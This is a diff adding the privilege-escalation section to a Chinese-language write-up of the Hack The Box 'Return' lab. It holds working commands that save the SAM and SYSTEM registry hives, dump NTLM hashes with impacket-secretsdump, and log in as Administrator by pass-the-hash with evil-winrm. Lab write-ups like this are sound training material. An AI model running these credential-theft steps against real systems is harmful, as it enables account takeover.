@@ -1,5 +1,5 @@
 ---
-description: Easy / LDAP明文传输 /
+description: Easy / LDAP明文传输 / SeBackupPrivilege提权
 ---
 
 # ✔️ Return
@@ -74,26 +74,45 @@ upload /root/Documents/HTB-AD/return/info/winPEASx64.exe
 
 <figure><img src="../../.gitbook/assets/14.png" alt=""><figcaption></figcaption></figure>
 
-*
+* 在winPEAS的输出信息中，找到了当前账户的所有的权限中有sebackupprivilege权限，这意味着当前用户在目标系统中有了读取文件和数据的能力。因此，决定从目标系统的SAM中提取高权限用户的哈希，并以此作为登录的凭证：
 
+<figure><img src="../../.gitbook/assets/15 (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/16 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
+* 创建一个/temp目录，并将HKLM的sam.hive和system.hive复制到 /temp目录下并下载：
 
+```bash
+# evil-winrm
+mkdir C:\temp
+reg save hklm\sam C:\temp\sam.hive
+reg save hklm\system C:\temp\system.hive
+```
 
+<figure><img src="../../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
+
+* 再使用impacket-secretsdump获取NTLM哈希：
+
+```bash
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```
+
+<figure><img src="../../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
+
+* 最后使用获取到的Administrator账户的哈希，利用evil-winrm进行登录，至此提权成功！
+
+```bash
+evil-winrm -i return.local -u "Administrator" -H "34386a771aaca697f447754e4863d38a"
+```
 
 
 
 {% hint style="info" %}
-
+Get Shell阶段除了常规的枚举之外，还应注意那些最直接的信息。提权阶段锁定漏洞时，有时手动枚举可能会比工具枚举来的更快一些。特别是网络状况不太好时，传输文件会极其的慢。
 {% endhint %}
